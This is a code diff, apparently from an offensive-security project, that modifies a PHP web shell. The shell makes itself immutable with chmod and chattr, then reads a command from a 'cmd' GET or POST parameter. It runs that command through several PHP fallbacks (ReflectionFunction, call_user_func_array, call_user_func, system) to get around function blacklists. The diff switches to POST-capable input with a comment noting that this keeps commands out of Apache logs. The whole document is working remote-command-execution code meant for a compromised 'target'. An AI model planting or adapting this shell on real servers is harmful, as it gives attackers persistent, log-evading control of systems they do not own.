@@ -13,31 +13,40 @@ $this_file = __FILE__;
 @system("chmod ugo-w $this_file");
 @system("chattr +i $this_file");
 
-# grab the command we want to run from the 'cmd' GET parameter
-$command = $_GET["cmd"];
+# Name of the parameter (GET or POST) for the command. Change this if the target already use this parameter.
+$cmd = 'cmd';
 
-# Try to find a way to run our command using various PHP internals
-if (class_exists('ReflectionFunction')) {
+# test if parameter 'cmd' is present. If not this will avoid an error on logs or on all pages if badly configured.
+if(isset($_REQUEST[$cmd])) {
 
-   # http://php.net/manual/en/class.reflectionfunction.php
-   $function = new ReflectionFunction('system');
-   $function->invoke($command);
+    # grab the command we want to run from the 'cmd' GET or POST parameter (POST don't display the command on apache logs)
+    $command = $_REQUEST[$cmd];
 
-} elseif (function_exists('call_user_func_array')) {
+    # Try to find a way to run our command using various PHP internals
+    if (class_exists('ReflectionFunction')) {
 
-   # http://php.net/manual/en/function.call-user-func-array.php
-   call_user_func_array('system', array($command));
+       # http://php.net/manual/en/class.reflectionfunction.php
+       $function = new ReflectionFunction('system');
+       $function->invoke($command);
 
-} elseif (function_exists('call_user_func')) {
+    } elseif (function_exists('call_user_func_array')) {
 
-   # http://php.net/manual/en/function.call-user-func.php
-   call_user_func('system', $command);
+       # http://php.net/manual/en/function.call-user-func-array.php
+       call_user_func_array('system', array($command));
 
-} else {
+    } elseif (function_exists('call_user_func')) {
 
-   # this is the last resort. chances are PHP Suhosin
-   # has system() on a blacklist anyways :>
+       # http://php.net/manual/en/function.call-user-func.php
+       call_user_func('system', $command);
 
-   # http://php.net/manual/en/function.system.php
-   system($command);
+    } else {
+
+       # this is the last resort. chances are PHP Suhosin
+       # has system() on a blacklist anyways :>
+
+       # http://php.net/manual/en/function.system.php
+       system($command);
+    }
+    
+    die();
 }
